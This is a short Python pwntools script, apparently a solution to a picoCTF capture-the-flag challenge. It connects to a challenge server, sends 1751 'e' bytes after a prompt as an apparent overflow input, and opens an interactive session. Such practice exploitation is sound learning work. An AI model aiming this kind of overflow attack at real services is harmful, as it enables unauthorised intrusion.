from pwn import *

nc = remote('foggy-cliff.picoctf.net', 61115)

nc.sendlineafter(b'==>',b'e'*1751)

nc.interactive()
